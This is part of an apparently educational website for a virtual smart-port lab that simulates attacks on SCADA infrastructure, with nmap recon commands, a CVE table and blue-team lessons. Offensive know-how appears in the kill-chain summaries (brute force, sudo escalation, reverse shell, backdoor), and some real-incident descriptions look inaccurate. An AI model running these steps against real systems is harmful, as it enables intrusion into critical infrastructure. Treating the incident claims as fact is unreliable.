+<!-- ╔══════════════════════════════════╗
+     ║   PAGE: HOME                    ║
+     ╚══════════════════════════════════╝ -->
+<div id="pg-home" class="pg on">
+
+<section class="hero">
+  <canvas id="heroCanvas"></canvas>
+  <div class="hgrid"></div>
+  <div class="hvig"></div>
+  <div class="W hcontent">
+    <div class="h2col">
+      <!-- LEFT: title + text + tags + stats -->
+      <div class="hleft">
+        <div class="hbadge"><div class="hbdot"></div><div class="hbt">Smart Port Infrastructure · Offensive Security Research Lab</div></div>
+        <div class="hkicker">Tanger Med Inspired · Red Team × Blue Team</div>
+        <div class="DXL">PORT<br><span class="tc">UNDER</span><br>SIEGE</div>
+        <p class="BM" style="max-width:520px;margin-top:14px;color:var(--bone);">A <strong>complete hands-on cybersecurity lab</strong> built on 2 real virtual machines — attacking and defending a simulated smart port infrastructure. 4 attack simulations, 9 CVEs discovered, every command documented for both practitioners and learners.</p>
+        <div class="htags">
+          <span class="htag ht3">Network Recon</span>
+          <span class="htag ht1">SSH Brute Force</span>
+          <span class="htag ht4">SCADA / ICS Attack</span>
+          <span class="htag ht0">Lateral Movement</span>
+          <span class="htag ht2">Honeypot</span>
+          <span class="htag ht5">Python SIEM</span>
+          <span class="htag ht3">CVE Mapping</span>
+          <span class="htag ht1">Privilege Escalation</span>
+          <span class="htag ht5">Forensics</span>
+          <span class="htag ht0">Reverse Shell</span>
+          <span class="htag ht2">Fail2ban</span>
+        </div>
+        <div class="hstats">
+          <div class="hstat hs0"><span class="hsv">4</span><div class="hsl">Simulations</div></div>
+          <div class="hstat hs1"><span class="hsv">9+</span><div class="hsl">CVEs Found</div></div>
+          <div class="hstat hs2"><span class="hsv">2</span><div class="hsl">Real VMs</div></div>
+          <div class="hstat hs3"><span class="hsv">100%</span><div class="hsl">Detected</div></div>
+        </div>
+      </div>
+      <!-- RIGHT: live terminal -->
+      <div class="hright">
+        <div style="font-family:var(--mono);font-size:8px;letter-spacing:2px;text-transform:uppercase;color:var(--fog);margin-bottom:7px;display:flex;align-items:center;gap:7px;"><div class="npulse"></div>SIEM LIVE FEED — ALL 4 SIMULATIONS</div>
+        <div class="term">
+          <div class="tbar"><div class="td1"></div><div class="td2"></div><div class="td3"></div><div class="ttit">siem_monitor.py — LIVE</div></div>
+          <div class="tbody" id="TS">
+            <div class="lc"># SmartPort SIEM · Tanger Med Lab · 4 Simulations</div>
+            <div class="lc"># SSH · Recon · SCADA · Pivot · Forensics</div>
+            <div class="lc">──────────────────────────────────────────</div>
+            <div id="TSS"></div><div class="blink"></div>
+          </div>
+        </div>
+        <div style="margin-top:10px;display:grid;grid-template-columns:1fr 1fr;gap:6px;">
+          <div style="background:var(--abyss);border:1px solid var(--bdr);border-left:2px solid var(--red);padding:9px 11px;">
+            <div style="font-family:var(--mono);font-size:7.5px;letter-spacing:1.5px;text-transform:uppercase;color:var(--red);margin-bottom:3px;">Kali Linux · Attacker</div>
+            <div style="font-family:var(--mono);font-size:9.5px;color:var(--bone);">192.168.64.4</div>
+          </div>
+          <div style="background:var(--abyss);border:1px solid var(--bdr);border-left:2px solid var(--cyan);padding:9px 11px;">
+            <div style="font-family:var(--mono);font-size:7.5px;letter-spacing:1.5px;text-transform:uppercase;color:var(--cyan);margin-bottom:3px;">Ubuntu SCADA · Target</div>
+            <div style="font-family:var(--mono);font-size:9.5px;color:var(--bone);">192.168.64.2</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ABOUT THE PROJECT -->
+<section class="SP2" style="background:var(--abyss);border-top:1px solid var(--bdr);">
+<div class="W">
+  <div class="eye rv">The Project</div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:48px;align-items:start;" class="rv">
+    <div>
+      <h2 class="DM" style="margin-bottom:16px;">What is this <span class="tc">lab</span>?</h2>
+      <p class="BM" style="margin-bottom:12px;">This project is a <strong>fully hands-on cybersecurity research lab</strong> inspired by Tanger Med — Africa's #1 container port. Built on two real virtual machines (UTM/macOS), it reproduces 4 complete attack scenarios against a simulated smart port infrastructure and documents every single technical step.</p>
+      <p class="BM" style="margin-bottom:12px;"><strong>Why Tanger Med?</strong> Because smart ports combine IT and OT (Operational Technology) — the same network that runs Apache and SSH also controls 16-ton cranes, GPS, fuel sensors, and refrigerated container units. A single misconfigured service becomes a path to physical equipment damage.</p>
+      <p class="BM" style="margin-bottom:12px;"><strong>Who is this for?</strong> Cybersecurity learners who want to see real commands and real outputs — not slides. Security teams working on critical infrastructure. Developers who want to understand what "misconfigured sudo" actually means in practice.</p>
+      <p class="BM">Each simulation covers both sides: the <strong>Red Team attack</strong> (what the attacker does and why it works) and the <strong>Blue Team defense</strong> (detection, forensics, and remediation). Every command shown here was actually executed — you can run them yourself.</p>
+    </div>
+    <div>
+      <h2 class="DM" style="margin-bottom:16px;">The lab <span class="tc">setup</span></h2>
+      <div class="NETD">
+        <div class="NDTIT">// Lab Architecture · NAT Network 192.168.64.0/24</div>
+        <div class="NDROW">
+          <div class="NDNODE">
+            <div class="NDI R">💀</div>
+            <div class="NDL">Kali Linux</div>
+            <div class="NDIP">192.168.64.4</div>
+            <div style="font-family:var(--mono);font-size:7.5px;color:var(--red);margin-top:2px;">Red Team · Attacker</div>
+          </div>
+          <div class="NDCONN">
+            <div class="NDLINE R"></div>
+            <div class="NDTAG R">SSH:22 · SCADA:5020</div>
+          </div>
+          <div class="NDNODE">
+            <div class="NDI C">🛡️</div>
+            <div class="NDL">Ubuntu SCADA</div>
+            <div class="NDIP">192.168.64.2</div>
+            <div style="font-family:var(--mono);font-size:7.5px;color:var(--cyan);margin-top:2px;">Blue Team · Target</div>
+          </div>
+          <div class="NDCONN">
+            <div class="NDLINE V"></div>
+            <div class="NDTAG V">SIEM · Logs · Alerts</div>
+          </div>
+          <div class="NDNODE">
+            <div class="NDI V">📊</div>
+            <div class="NDL">SIEM + Honeypot</div>
+            <div class="NDIP">Fail2ban · Python</div>
+            <div style="font-family:var(--mono);font-size:7.5px;color:var(--violet);margin-top:2px;">Detection Layer</div>
+          </div>
+        </div>
+      </div>
+      <div class="IB C" style="margin-top:12px;"><div class="ibl">⚙️ Complete tools list</div><p>Kali Linux · Ubuntu 24 LTS · Nmap 7.95 · Hydra · arpspoof · tcpdump · Python 3.12 · Paramiko (SSH honeypot) · Fail2ban 1.1 · Netcat · ReportLab (PDF reports) · Custom Python SIEM</p></div>
+    </div>
+  </div>
+</div>
+</section>
+
+
+<!-- REAL WORLD ATTACKS -->
+<section class="SP2">
+<div class="W">
+  <div class="eye rv">Why this matters — Real incidents</div>
+  <h2 class="DM rv" style="margin-bottom:8px;">These attacks already <span class="tr">happened</span></h2>
+  <p class="BM rv" style="max-width:600px;margin-bottom:0;">Every simulation in this lab replicates a real-world port attack. This is not theory — these incidents caused billions in damage and disrupted global supply chains.</p>
+  <div class="RAG rv">
+    <div class="RAC"><div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;"><div class="RAY">2017</div><span class="CVSS C">CRITICAL</span></div><div class="RAP">Maersk / 17 Global Ports</div><div class="RAT">NotPetya Ransomware</div><p class="RAD">Paralyzed 17 ports including Rotterdam and Los Angeles. 45,000 PCs destroyed. <strong>$300M in damages</strong>. Entry: lateral movement across unpatched IT/OT network — exactly Simulation 4's scenario.</p><div class="RATGS"><span class="RAG2">IT/OT lateral move</span><span class="RAG2">No segmentation</span></div></div>
+    <div class="RAC"><div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;"><div class="RAY">2018</div><span class="CVSS H">HIGH</span></div><div class="RAP">Barcelona & San Diego Ports</div><div class="RAT">SSH Credential Attack</div><p class="RAD">Coordinated attacks hit both ports simultaneously. Systems forced offline. <strong>Initial vector: compromised SSH credentials</strong> — the exact technique in Simulation 2, found in 4 attempts with a thematic wordlist.</p><div class="RATGS"><span class="RAG2">SSH brute force</span><span class="RAG2">Weak passwords</span></div></div>
+    <div class="RAC"><div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;"><div class="RAY">2021</div><span class="CVSS C">CRITICAL</span></div><div class="RAP">Port of Houston · ICS</div><div class="RAT">SCADA Manipulation</div><p class="RAD">Attacker accessed water treatment SCADA and tried to modify industrial parameters. <strong>Zero authentication on SCADA interface</strong> — identical to SCADA-001 (CVSS 10.0) we discovered in Simulation 1.</p><div class="RATGS"><span class="RAG2">SCADA no-auth</span><span class="RAG2">Data injection</span></div></div>
+    <div class="RAC"><div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;"><div class="RAY">2022</div><span class="CVSS C">CRITICAL</span></div><div class="RAP">Hamburg · Antwerp · Amsterdam</div><div class="RAT">BlackCat — Oil Terminals</div><p class="RAD">BlackCat ransomware simultaneously hit oil terminals at 3 major NATO ports. Automated loading systems blocked. The <strong>Pentagon issued an alert</strong> about port infrastructure vulnerabilities days after.</p><div class="RATGS"><span class="RAG2">OT targeting</span><span class="RAG2">Physical impact</span></div></div>
+    <div class="RAC"><div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;"><div class="RAY">2023</div><span class="CVSS H">HIGH</span></div><div class="RAP">DP World — Australia</div><div class="RAT">4-Day National Shutdown</div><p class="RAD">DP World Australia paralyzed for <strong>4 full days</strong>. 30,000 containers stranded in Sydney, Melbourne, Brisbane, Perth. Vector: VPN access without MFA after reconnaissance — the exact Sim 1 → 4 chain we built.</p><div class="RATGS"><span class="RAG2">Recon → pivot</span><span class="RAG2">No MFA</span></div></div>
+    <div class="RAC HI"><div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;"><div class="RAY">2026</div><span class="CVSS L">LAB</span></div><div class="RAP">Tanger Med · Virtual Lab</div><div class="RAT">This Project — All 4 Vectors</div><p class="RAD">This lab reproduces all these attack vectors in a controlled environment. <strong>Every attack was detected</strong>, logged by SIEM, and documented with full forensic Blue Team response. Education-grade, professional execution.</p><div class="RATGS"><span class="RAG2 G">✓ Detected</span><span class="RAG2 G">✓ Documented</span><span class="RAG2 G">✓ Remediated</span></div></div>
+  </div>
+</div>
+</section>
+
+<!-- WHY SMART PORT -->
+<section class="SP2" style="background:var(--abyss);border-top:1px solid var(--bdr);border-bottom:1px solid var(--bdr);">
+<div class="W">
+  <div class="eye rv">Why Tanger Med?</div>
+  <h2 class="DM rv" style="margin-bottom:6px;">The attack surface is <span class="tc">enormous</span></h2>
+  <p class="BM rv" style="max-width:620px;">Tanger Med is not just a port — it's a cyber-physical system. SCADA controllers, IoT sensors, automated cranes, GPS, fuel management — all connected on the same network. One compromised credential can escalate to physical equipment damage.</p>
+  <div class="WHY rv">
+    <div class="WC W0"><div class="WCN">9M</div><span class="WCICO">🚢</span><div class="WCTI">9 Million TEU/Year</div><p>Africa's #1 port. A 4-day shutdown like DP World Australia costs hundreds of millions and disrupts Europe–Africa–Asia supply chains.</p></div>
+    <div class="WC W1"><div class="WCN">OT</div><span class="WCICO">⚡</span><div class="WCTI">IT/OT Convergence</div><p>Industrial SCADA systems once isolated now run on standard IP networks. Every SSH CVE, every Apache bug, every proxy misconfiguration becomes a pathway to physical equipment.</p></div>
+    <div class="WC W2"><div class="WCN">10</div><span class="WCICO">💥</span><div class="WCTI">CVSS 10.0 Found</div><p>Our lab discovered 4 critical vulnerabilities including CVSS 10.0 on the SCADA port — zero authentication required for any machine on the network to read and falsify industrial sensor data.</p></div>
+    <div class="WC W3"><div class="WCN">#1</div><span class="WCICO">🌍</span><div class="WCTI">Strategic Hub</div><p>Strait of Gibraltar. 180 global destinations. A cyberattack here disrupts Morocco's national critical infrastructure and affects Mediterranean trade routes.</p></div>
+  </div>
+</div>
+</section>
+
+<!-- KILL CHAIN -->
+<section class="SP2">
+<div class="W">
+  <div class="eye rv">The Full Attack Kill Chain</div>
+  <h2 class="DM rv" style="margin-bottom:8px;">4 simulations, <span class="tc">one complete APT</span></h2>
+  <p class="BM rv" style="max-width:600px;margin-bottom:28px;">Each simulation builds on the previous. Together they form an Advanced Persistent Threat lifecycle — exactly how real port attacks like Maersk 2017 and DP World 2023 unfolded. Click any phase to explore it in detail.</p>
+  <div class="KC rv">
+    <div class="KCS done" onclick="G('sim2')"><div class="KCN">01</div><div class="KCTI">Reconnaissance</div><p class="KCSUB">Map the network. Detect 4 open services. Auto-discover 9 CVEs. Find the hidden open proxy. Build the attack blueprint.</p><span class="KCBADGE">✓ Complete</span></div>
+    <div class="KCA">→</div>
+    <div class="KCS done" onclick="G('sim1')"><div class="KCN">02</div><div class="KCTI">Initial Access</div><p class="KCSUB">SSH brute force with OSINT wordlist. Password found in 4 attempts. 89 honeypot captures. 3 progressive bans triggered.</p><span class="KCBADGE">✓ Complete</span></div>
+    <div class="KCA">→</div>
+    <div class="KCS done" onclick="G('sim4')"><div class="KCN">03</div><div class="KCTI">Lateral Movement</div><p class="KCSUB">SSH pivot → sudo exploit → root shell in 1 command. Direct SCADA access. Cron reverse shell. SSH backdoor key.</p><span class="KCBADGE">✓ Complete</span></div>
+    <div class="KCA">→</div>
+    <div class="KCS done" onclick="G('sim3')"><div class="KCN">04</div><div class="KCTI">Impact — SCADA</div><p class="KCSUB">ARP MitM spoof. Crane load falsified 15t→38.5t. Temperature 3°C→87.5°C. SIEM alert in under 1 second.</p><span class="KCBADGE">✓ Complete</span></div>
+  </div>
+</div>
+</section>
+
+<!-- ALL 4 SIMULATIONS TABLE -->
+<section class="SP2" style="background:var(--abyss);border-top:1px solid var(--bdr);">
+<div class="W">
+  <div class="eye rv">All 4 Simulations</div>
+  <h2 class="DM rv" style="margin-bottom:6px;">Click any simulation to <span class="tc">explore in depth</span></h2>
+  <p class="BS rv">Every page includes: full command walkthrough · technical explanation for learners · real terminal outputs · SIEM alerts · Blue Team forensic response</p>
+  <table class="SIMT rv">
+    <thead><tr><th>#</th><th>Simulation</th><th>Key Result</th><th>Severity</th><th></th></tr></thead>
+    <tbody>
+      <tr onclick="G('sim2')"><td><div class="SIMN">01</div></td><td><div class="SIMTNAME">Network Reconnaissance</div><div class="SIMSUB">Nmap · CVE Mapping · Open Proxy Discovery · PDF Report</div><div style="margin-top:6px;"><span class="tag t3">Nmap</span><span class="tag t3">Python CVE</span><span class="tag t2">Squid Proxy</span></div></td><td class="BS">4 services mapped. 9 CVEs found. Open proxy discovered on :3128. Full recon PDF generated.</td><td><span class="CVSS C">CVSS 10.0</span></td><td><button class="GOBTN">Open →</button></td></tr>
+      <tr onclick="G('sim1')"><td><div class="SIMN">02</div></td><td><div class="SIMTNAME">SSH Brute Force</div><div class="SIMSUB">Hydra · OSINT Wordlist · Honeypot (Paramiko) · Fail2ban Progressive</div><div style="margin-top:6px;"><span class="tag t1">Hydra</span><span class="tag t2">Honeypot</span><span class="tag t5">Fail2ban</span><span class="tag t4">SIEM</span></div></td><td class="BS">tangermed2024 cracked in 4 attempts. 89 honeypot captures. 3 progressive bans (1→2→4 min).</td><td><span class="CVSS H">HIGH</span></td><td><button class="GOBTN">Open →</button></td></tr>
+      <tr onclick="G('sim3')"><td><div class="SIMN">03</div></td><td><div class="SIMTNAME">SCADA / IoT MitM Attack</div><div class="SIMSUB">ARP Spoofing · tcpdump · Python Sensor Injection · SIEM Real-time</div><div style="margin-top:6px;"><span class="tag t4">arpspoof</span><span class="tag t4">inject_v2.py</span><span class="tag t5">SIEM</span></div></td><td class="BS">Crane load: 16t→38.5t. Temperature: 3°C→87.5°C. Fuel: 74%→0%. SIEM detection in &lt;1s.</td><td><span class="CVSS C">CVSS 10.0</span></td><td><button class="GOBTN">Open →</button></td></tr>
+      <tr onclick="G('sim4')"><td><div class="SIMN">04</div></td><td><div class="SIMTNAME">Lateral Movement & Privilege Escalation</div><div class="SIMSUB">SSH Pivot · sudo Exploit · Root Shell · Cron Backdoor · Forensics</div><div style="margin-top:6px;"><span class="tag t0">SSH pivot</span><span class="tag t1">sudo escalation</span><span class="tag t0">reverse shell</span><span class="tag t5">Blue Team</span></div></td><td class="BS">portuser→root in 1 command. Reverse shell on Kali every 60s. Both backdoors forensically found & removed.</td><td><span class="CVSS C">CRITICAL</span></td><td><button class="GOBTN">Open →</button></td></tr>
+    </tbody>
+  </table>
+</div>
+</section>
+
+<!-- CVE TABLE -->
+<section class="SP2">
+<div class="W">
+  <div class="eye rv">All CVEs Discovered — Simulation 1</div>
+  <h2 class="DM rv" style="margin-bottom:8px;">9 real vulnerabilities, <span class="tr">4 critical</span></h2>
+  <p class="BM rv" style="max-width:560px;">Found via Nmap version detection + Python CVE mapping on the simulated port server running standard software versions. All have public patches — none require zero-day exploitation.</p>
+  <table class="T rv" style="margin-top:18px;">
+    <thead><tr><th>CVE / ID</th><th>Service · Version</th><th>CVSS</th><th>Description</th><th>Level</th></tr></thead>
+    <tbody>
+      <tr><td><span class="cve-id">CVE-2024-6387</span></td><td style="font-family:var(--mono);font-size:10.5px;color:var(--blue);">OpenSSH 9.6p1</td><td><span class="CVSS C">9.8</span></td><td class="BS"><strong>RegreSSHion</strong> — Race condition in SIGALRM handler allows unauthenticated Remote Code Execution. Affects millions of servers globally. Discovered July 2024.</td><td><span style="font-family:var(--mono);font-size:9px;font-weight:700;color:var(--red);">CRITICAL</span></td></tr>
+      <tr><td><span class="cve-id">CVE-2024-38474</span></td><td style="font-family:var(--mono);font-size:10.5px;color:var(--blue);">Apache 2.4.58</td><td><span class="CVSS C">9.1</span></td><td class="BS">Handler substitution in mod_rewrite allows arbitrary script execution via crafted HTTP requests. No authentication required.</td><td><span style="font-family:var(--mono);font-size:9px;font-weight:700;color:var(--red);">CRITICAL</span></td></tr>
+      <tr><td><span class="cve-id">SCADA-001</span></td><td style="font-family:var(--mono);font-size:10.5px;color:var(--violet);">SCADA / Port 5020</td><td><span class="CVSS C">10.0</span></td><td class="BS"><strong>Zero authentication</strong> on industrial control interface. Any machine on the network can read/write all sensor data. Directly exploited in Simulations 3 and 4.</td><td><span style="font-family:var(--mono);font-size:9px;font-weight:700;color:var(--red);">CRITICAL</span></td></tr>
+      <tr><td><span class="cve-id">SCADA-002</span></td><td style="font-family:var(--mono);font-size:10.5px;color:var(--violet);">SCADA / Port 5020</td><td><span class="CVSS C">9.5</span></td><td class="BS">Zero encryption on all SCADA communications. Sensor data transmitted in plaintext — fully readable via ARP MitM interception. Demonstrated in Simulation 3.</td><td><span style="font-family:var(--mono);font-size:9px;font-weight:700;color:var(--red);">CRITICAL</span></td></tr>
+      <tr><td><span class="cve-id">CVE-2024-38473</span></td><td style="font-family:var(--mono);font-size:10.5px;color:var(--blue);">Apache 2.4.58</td><td><span class="CVSS H">7.5</span></td><td class="BS">Incorrect encoding handling in mod_proxy enables authentication and ACL bypass via crafted URLs.</td><td><span style="font-family:var(--mono);font-size:9px;font-weight:700;color:var(--amber);">HIGH</span></td></tr>
+      <tr><td><span class="cve-id">CVE-2023-45802</span></td><td style="font-family:var(--mono);font-size:10.5px;color:var(--blue);">Apache 2.4.58</td><td><span class="CVSS H">7.5</span></td><td class="BS">HTTP/2 stream reset causes memory corruption — remote denial of service with no authentication required.</td><td><span style="font-family:var(--mono);font-size:9px;font-weight:700;color:var(--amber);">HIGH</span></td></tr>
+      <tr><td><span class="cve-id">CVE-2024-45802</span></td><td style="font-family:var(--mono);font-size:10.5px;color:var(--blue);">Squid Proxy 6.13</td><td><span class="CVSS H">7.5</span></td><td class="BS">DoS via ESI response processing crash. Open proxy on :3128 also enables anonymous traffic routing through port infrastructure.</td><td><span style="font-family:var(--mono);font-size:9px;font-weight:700;color:var(--amber);">HIGH</span></td></tr>
+      <tr><td><span class="cve-id">CVE-2023-51385</span></td><td style="font-family:var(--mono);font-size:10.5px;color:var(--blue);">OpenSSH 9.6p1</td><td><span class="CVSS H">6.5</span></td><td class="BS">Command injection through special-character usernames during ssh_config hostname expansion.</td><td><span style="font-family:var(--mono);font-size:9px;font-weight:700;color:var(--amber);">HIGH</span></td></tr>
+      <tr><td><span class="cve-id">CVE-2024-37894</span></td><td style="font-family:var(--mono);font-size:10.5px;color:var(--blue);">Squid Proxy 6.13</td><td><span class="CVSS M">6.3</span></td><td class="BS">Internal resource access via unauthenticated open proxy — bonus finding during Simulation 1 scan. Not initially expected.</td><td><span style="font-family:var(--mono);font-size:9px;font-weight:700;color:var(--blue);">MEDIUM</span></td></tr>
+    </tbody>
+  </table>
+</div>
+</section>
+
+<footer><div class="FL">SMART PORT CYBERSECURITY LAB · TANGER MED INSPIRED · 2026</div><div class="FR"><a onclick="G('sim2')">Sim 1</a><a onclick="G('sim1')">Sim 2</a><a onclick="G('sim3')">Sim 3</a><a onclick="G('sim4')">Sim 4</a><a onclick="G('def')">Defense</a></div></footer>
+</div>
+
+<!-- ╔══════════════════════════════════╗
+     ║  SIM 2 — RECONNAISSANCE         ║
+     ╚══════════════════════════════════╝ -->
+<div id="pg-sim2" class="pg">
+<section class="SH" style="background:var(--abyss);">
+  <div class="SHBG" style="background-image:linear-gradient(rgba(77,168,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(77,168,255,.04) 1px,transparent 1px);background-size:60px 60px;inset:0;position:absolute;"></div>
+  <div class="SHNUM">01</div>
+  <div class="W" style="position:relative;z-index:1;width:100%;">
+    <div class="BC"><span onclick="G('home')" style="cursor:pointer;color:var(--warm);">Home</span><span class="BCS">›</span><span class="BCC">Simulation 01 — Network Reconnaissance</span></div>
+    <div class="eye B">Phase 1 · Mapping the battlefield</div>
+    <h1 class="DL">NETWORK <span class="tb">RECON</span></h1>
+    <div style="font-family:var(--mono);font-size:13px;letter-spacing:3px;color:var(--fog);margin-top:8px;text-transform:uppercase;">Nmap 7.95 · Python CVE Mapping · Open Proxy Discovery</div>
+  </div>
+</section>
+<section class="SP">
+<div class="W">
+  <div class="IB C"><div class="ibl">📖 For Learners — What is Reconnaissance?</div><p>Before any real cyberattack, the attacker needs a complete map of the target. Reconnaissance (recon) is the process of scanning a network to discover: which machines exist, what services are running, what software versions are installed, and what known vulnerabilities (CVEs) those versions have. Think of it like casing a building before a heist — you need to know every door and window before picking which one to enter. In professional pentesting, this is called the "information gathering" or "discovery" phase of the PTES (Penetration Testing Execution Standard).</p></div>
+  <div class="DTL">
+    <div>
+      <div class="eye B" style="margin-bottom:12px;">Step A — Host Discovery (Ping Sweep)</div>
+      <h3 class="DS" style="margin-bottom:12px;">Finding all <span class="tb">live machines</span></h3>
+      <p class="BM" style="margin-bottom:12px;">The first command identifies every active machine on the 192.168.64.0/24 subnet. The <strong>-sn flag</strong> (no port scan) simply pings each IP to check if it's alive. This generates very little traffic and is difficult to detect without a properly configured IDS/IPS.</p>
+      <pre class="CB"><span class="CC"># Step A — Run from Kali Linux terminal</span>
+<span class="CMD">sudo nmap</span> <span class="FLG">-sn</span> <span class="VAL">192.168.64.0/24</span>
+
+<span class="CC"># Output — 3 hosts found on the port network segment:</span>
+<span class="OK">Nmap scan report for 192.168.64.1</span>  <span class="OUT">→ Gateway (router)</span>
+<span class="OK">Nmap scan report for 192.168.64.2</span>  <span class="OUT">→ Ubuntu SCADA server ← PRIMARY TARGET</span>
+<span class="OK">Nmap scan report for 192.168.64.4</span>  <span class="OUT">→ Kali Linux (our machine)</span>
+
+<span class="OK">3 hosts up</span> <span class="OUT">| Scan completed in 2.11 seconds</span></pre>
+
+      <div class="eye B" style="margin-bottom:12px;margin-top:20px;">Step B — Deep Service & Version Scan</div>
+      <h3 class="DS" style="margin-bottom:12px;">Identifying every <span class="tb">open door</span></h3>
+      <p class="BM" style="margin-bottom:12px;">Now we run an aggressive full scan on the target (192.168.64.2). Each flag has a specific purpose: <strong>-sV</strong> probes each open port to identify the exact software and version, <strong>-sC</strong> runs Nmap's default scripts (like checking for open proxies, anonymous FTP, etc.), <strong>-O</strong> fingerprints the operating system, <strong>-A</strong> enables aggressive detection. The output is saved for the CVE analysis script.</p>
+      <pre class="CB A"><span class="CC"># Step B — Full version + script + OS detection scan</span>
+<span class="CMD">sudo nmap</span> <span class="FLG">-sV -sC -O -A</span> <span class="VAL">192.168.64.2</span> <span class="FLG">-oN</span> <span class="VAL">~/recon_lab/scan_scada.txt</span>
+
+<span class="CC"># Discovered services — Complete results:</span>
+<span class="FLG">22/tcp    open  ssh</span>    <span class="OK">OpenSSH 9.6p1 Ubuntu 4ubuntu0.3</span>
+<span class="FLG">80/tcp    open  http</span>   <span class="OK">Apache httpd 2.4.58 (Ubuntu)</span>
+                        <span class="WRN">|_http-server-header: Apache/2.4.58 (Ubuntu)</span>
+<span class="FLG">3128/tcp  open  http</span>   <span class="OK">Squid http proxy 6.13</span>
+                        <span class="ERR">|_http-open-proxy: Potentially OPEN proxy ← UNEXPECTED!</span>
+<span class="FLG">5020/tcp  open  ftp?</span>   <span class="OK">Python SCADA server (custom)</span>
+                        <span class="ERR">|_ No authentication banner detected</span>
+
+<span class="OUT">OS: Linux 4.15 - 5.19 (Ubuntu 24) | 96% confidence</span>
+<span class="OUT">Scan duration: 13.62 seconds</span></pre>
+
+      <div class="IB A"><div class="ibl">⚠️ Unexpected Critical Finding — Open Proxy on :3128</div><p>Nmap's default scripts automatically flagged Squid proxy on port 3128 as an open proxy — meaning it accepts connections from anyone without authentication. This was NOT expected before the scan. An open proxy in port infrastructure can be used to: (1) route attack traffic anonymously through the port's own IP, (2) access internal resources not directly reachable, (3) bypass firewall rules by pivoting. This is a perfect example of why automated recon matters — you find what you don't know you're looking for.</p></div>
+
+      <div class="eye B" style="margin-bottom:12px;margin-top:20px;">Step C — Automated CVE Mapping</div>
+      <h3 class="DS" style="margin-bottom:12px;">Turning versions into <span class="tr">exploitable vulnerabilities</span></h3>
+      <p class="BM" style="margin-bottom:12px;">A custom Python script reads the Nmap output file, parses each service name and version, then cross-references them against a local CVE database (mirroring NVD — National Vulnerability Database). This is what professional tools like OpenVAS, Nessus, and Qualys do — except here every line of logic is visible and explainable.</p>
+      <pre class="CB V"><span class="CC"># Step C — Run CVE analyzer</span>
+<span class="CMD">python3</span> <span class="VAL">~/recon_lab/recon_analyzer.py</span>
+
+<span class="CC"># Analysis output:</span>
+<span class="ERR">► CVE-2024-6387   SSH 22   CVSS 9.8  CRITICAL  RegreSSHion — Unauth RCE</span>
+<span class="ERR">► CVE-2024-38474  HTTP 80  CVSS 9.1  CRITICAL  Apache mod_rewrite code exec</span>
+<span class="ERR">► SCADA-001       5020     CVSS 10.0 CRITICAL  Zero auth on SCADA interface</span>
+<span class="ERR">► SCADA-002       5020     CVSS 9.5  CRITICAL  Plaintext SCADA protocol</span>
+<span class="WRN">► CVE-2024-38473  HTTP 80  CVSS 7.5  HIGH      Apache auth bypass</span>
+<span class="WRN">► CVE-2023-45802  HTTP 80  CVSS 7.5  HIGH      HTTP/2 stream reset DoS</span>
+<span class="WRN">► CVE-2024-45802  Squid    CVSS 7.5  HIGH      Open proxy + crash vector</span>
+<span class="WRN">► CVE-2023-51385  SSH 22   CVSS 6.5  HIGH      SSH command injection</span>
+<span class="OUT">► CVE-2024-37894  Squid    CVSS 6.3  MEDIUM    Internal resource access</span>
+
+<span class="OK">═══════════════════════════════════════════════════</span>
+<span class="OK">SUMMARY: 9 vulnerabilities | 4 CRITICAL | Risk: CRITICAL</span>
+<span class="OK">PDF report generated: rapport_reconnaissance_tangermed.pdf</span></pre>
+
+      <div class="SIEM">
+        <div class="SIEMH"><span class="SIEMT">siem_recon.py — Detection Log</span><span class="SIEML"><div class="npulse"></div>ANALYSIS COMPLETE</span></div>
+        <div class="SIEMB">
+          <div class="SL"><span class="SLT">13:42:01</span><span class="SLEV slI">[INFO]</span><span class="SLM">Nmap scan started against 192.168.64.2 from 192.168.64.4</span></div>
+          <div class="SL"><span class="SLT">13:42:14</span><span class="SLEV slI">[INFO]</span><span class="SLM">4 services discovered — parsing version data</span></div>
+          <div class="SL"><span class="SLT">13:42:14</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">SCADA port 5020 — ZERO authentication (CVSS 10.0)</span></div>
+          <div class="SL"><span class="SLT">13:42:14</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">CVE-2024-6387 RegreSSHion — OpenSSH 9.6p1 (CVSS 9.8)</span></div>
+          <div class="SL"><span class="SLT">13:42:14</span><span class="SLEV slH">[HIGH]</span><span class="SLM">Open proxy detected on Squid 6.13 port 3128</span></div>
+          <div class="SL"><span class="SLT">13:42:15</span><span class="SLEV slG">[DONE]</span><span class="SLM">PDF report saved → rapport_reconnaissance_tangermed.pdf</span></div>
+        </div>
+      </div>
+
+      <div class="IB G"><div class="ibl">🔵 Blue Team Lesson — What should be done?</div><p>The entire recon output reveals a catastrophic misconfiguration: a SCADA port with <strong>CVSS 10.0</strong> (the maximum possible score) exposed on the network with zero authentication. The open proxy on :3128 should be restricted to internal IPs only. All CVEs have patches available — a proper patch management process would eliminate 7 of 9 vulnerabilities immediately. The SCADA port requires a complete re-architecture with authentication, encryption, and network segmentation.</p></div>
+    </div>
+    <div class="SB">
+      <div class="SBC"><div class="SBH">Scan Results</div><div class="SBB">
+        <div class="KPI"><span class="KL">Hosts discovered</span><span class="KV tb">3</span></div>
+        <div class="KPI"><span class="KL">Open ports found</span><span class="KV tb">4</span></div>
+        <div class="KPI"><span class="KL">CVEs identified</span><span class="KV tr">9</span></div>
+        <div class="KPI"><span class="KL">Critical CVEs (≥9.0)</span><span class="KV tr">4</span></div>
+        <div class="KPI"><span class="KL">Max CVSS score</span><span class="KV tr">10.0</span></div>
+        <div class="KPI"><span class="KL">Scan duration</span><span class="KV tc">13s</span></div>
+        <div class="KPI"><span class="KL">Open proxy found</span><span class="KV ta">⚠ YES</span></div>
+      </div></div>
+      <div class="SBC"><div class="SBH">Most Critical Finding</div><div class="SBB" style="text-align:center;padding:18px 12px;">
+        <div style="font-family:var(--mono);font-size:9.5px;color:var(--blue);margin-bottom:5px;">SCADA-001</div>
